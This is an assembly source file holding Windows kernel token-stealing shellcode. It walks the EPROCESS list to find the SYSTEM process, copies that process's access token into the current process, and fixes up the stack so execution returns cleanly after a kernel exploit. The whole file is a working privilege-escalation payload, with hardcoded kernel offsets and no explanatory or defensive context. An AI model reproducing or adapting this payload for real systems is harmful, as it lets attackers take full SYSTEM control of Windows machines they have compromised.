; Constants for Windows kernel offsets
KTHREAD_OFFSET     EQU 188h    ; Offset to current KTHREAD from GS
EPROCESS_OFFSET    EQU 0B8h    ; Offset to EPROCESS from KTHREAD.ApcState
ACTIVEPROCESSLINKS EQU 448h    ; Offset to ActiveProcessLinks
PID_OFFSET         EQU 440h    ; Offset to process ID
TOKEN_OFFSET       EQU 4b8h    ; Offset to process token

.code

SAVE_REGS MACRO
    push rax
    push rcx
    push rdx
ENDM

RESTORE_REGS MACRO
    pop rdx
    pop rcx
    pop rax
ENDM

token_stealing_shellcode_smep_no_kvashadow PROC
    SAVE_REGS
    xor rax,rax
    mov rax,gs:[rax+KTHREAD_OFFSET]    ; Get current KTHREAD
    mov rax,[rax+EPROCESS_OFFSET]      ; Get current EPROCESS
    mov rcx,rax
    mov edx,4h                         ; System process PID
__loop:
    mov rax,[rax+ACTIVEPROCESSLINKS]   ; Get next process
    sub rax,ACTIVEPROCESSLINKS         ; Adjust to get EPROCESS base
    cmp [rax+PID_OFFSET],rdx           ; Compare PID to system process PID
    jnz __loop
    mov rdx,[rax+TOKEN_OFFSET]         ; Get token
    mov [rcx+TOKEN_OFFSET],rdx         ; Set token
    RESTORE_REGS
    xor r12,r12
    add rsp,10h
    mov r15,[rsp+88h]
    ret
token_stealing_shellcode_smep_no_kvashadow ENDP

END
